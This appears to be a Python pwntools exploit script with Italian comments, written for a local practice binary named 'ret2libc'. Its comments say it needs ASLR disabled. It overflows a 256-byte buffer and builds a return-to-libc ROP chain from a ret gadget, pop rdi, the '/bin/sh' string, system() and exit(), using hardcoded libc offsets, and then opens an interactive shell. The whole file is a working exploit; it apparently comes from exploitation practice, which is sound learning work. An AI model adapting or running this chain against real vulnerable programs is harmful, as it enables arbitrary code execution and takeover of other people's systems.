from pwn import *
from pwn import p64


#Questo exploit si basa sulle vulnerabilità di libc e sfrutta il tool ropper per ricavare gli indirizzi dei gadget.
# Ha bisogno di ASLR disabilitato.
def main():
    e = ELF('../Machines/ret2libc')
    #libc_addr = 0x7ffff7dc9000 #indirizzo base di libc nel file eseguibile
    libc_addr = 0x7ffff7dc7000 #da portatile

    ret = p64(libc_addr + 0xc1801) #offset
    pop_rdi = p64(libc_addr + 0x23b6a) #offset
    bin_sh = p64(libc_addr + 0x1b45bd) #offset

    #system_addr = p64(0x7ffff7e1b290)
    system_addr = p64(0x7ffff7c4e520) #da portatile
    #exit_addr = p64(0x7ffff7e0fa40)
    exit_addr = p64(0x7ffff7c3e600) #da portatile

    payload = b"A" * 256
    payload += b"BBBBBBBB"
    payload += ret #aggiunta un return per prevenire errori nello stack
    payload += pop_rdi #aggiornamento del rip in modo che contenga pop rdi ret
    payload += bin_sh #inserimento indirizzo della stringa /bin/sh come argomento di system()
    payload += system_addr #jump all'indirizzo della funzione system()
    payload += exit_addr #chiamata della funzione exit()

    p = process(e.path)
    p.recvline()
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    main()